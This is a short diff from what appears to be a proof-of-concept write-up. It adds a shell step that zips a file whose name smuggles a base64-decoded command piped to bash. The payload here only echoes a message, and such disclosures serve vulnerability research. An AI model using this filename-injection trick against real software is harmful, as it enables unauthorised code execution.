@@ -17,5 +17,8 @@ total 36
 -rw-rw-r--  1 kali kali  1137 Aug 22 12:02  createfile.c
 -rw-r--r--  1 kali kali     9 Aug 22 12:02 'poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash`'
 
+└─$ zip poc.zip poc.txt\`\{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi\}\|\{base64,-d\}\|bash\` 
+  adding: poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash` (stored 0%)
+
 ```
 
